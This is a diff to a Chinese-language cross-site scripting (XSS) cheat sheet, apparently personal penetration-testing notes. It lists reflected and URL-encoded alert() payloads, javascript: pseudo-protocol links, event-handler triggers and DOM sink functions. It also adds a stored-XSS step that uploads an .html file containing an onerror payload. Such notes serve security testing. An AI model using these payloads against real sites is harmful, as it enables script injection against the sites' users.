@@ -6,7 +6,7 @@
 - `" autofocus onfocus=alert(1) x="`  
 - `<a href="javascript:alert(1)">`  
 - `javascript:alert(1);`  
-伪协议
+JavaScript伪协议，超链接的地方就可能会存在
 - `"><svg onload=alert(1)>`  
 - `<span title="" onmouseover="alert(/XSS/)">" onmouseover="alert(/XSS/)</span>`  
 - `'-alert(1)-'`  
@@ -20,7 +20,8 @@
 - 有引号处理文字时,如：var input='payload';  
 ` ${alert(1)} `
 - url编码  
-` %27%2dalert(1)%2d%27 `
+` %27%2dalert(1)%2d%27 `  
+`%3Ca%20hREf%20%3D%20%27javasCriPt%3Aalert(%2Fxss%2F)%27%3Eclick%20me!%3C%2Fa%3E` javascript伪协议  
 
 ## 事件执行触发POC:
 - accesskey:设置快捷键  
@@ -37,6 +38,9 @@
 	<script>alert(1)</script>
 </svg>
 ```
+
+## 存储型XSS
+上传文件修改为 `.html` ，内容为 `<img src=1 onerror=alert(document.domain)>`
 
 ## DOM XSS出现位置函数
 `document.write、location.search、eval（）、location、someDOMElement.innerHTML/uterHTML/insertAdjacentHTML/onevent`
